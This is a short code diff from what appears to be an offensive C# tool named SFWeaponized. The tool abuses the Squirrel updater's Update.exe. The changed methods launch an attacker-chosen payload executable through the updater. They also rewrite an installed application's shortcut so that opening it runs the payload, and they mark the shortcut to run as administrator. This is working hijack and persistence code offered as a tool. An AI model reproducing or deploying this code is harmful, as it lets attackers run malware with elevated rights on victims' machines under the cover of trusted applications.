@@ -32,14 +32,14 @@ namespace SFWeaponized.Model
             if (!File.Exists(updateFilePath))
                 return;
 
-            ProcessUtils.Run(updateFilePath, $"--processStart {payloadExeName} --process-start-args {Name}.exe");
+            ProcessUtils.Run(updateFilePath, $"--processStart \"{payloadExeName}\" --process-start-args \"{Name}.exe\"");
         }
 
-        public void PatchShortcut()
+        public void PatchShortcut(string payloadExeName)
         {
             if (!string.IsNullOrEmpty(ShortcutPath))
             {
-                ShortcutUtils.Edit(ShortcutPath, $"--processStart \"Payload.exe\" --process-start-args \"{Name}.exe\"", Path.Combine(Root, "Update.exe"));
+                ShortcutUtils.Edit(ShortcutPath, $"--processStart \"{payloadExeName}\" --process-start-args \"{Name}.exe\"", Path.Combine(Root, "Update.exe"));
                 ShortcutUtils.SetRunAsAdmin(ShortcutPath);
             }
         }
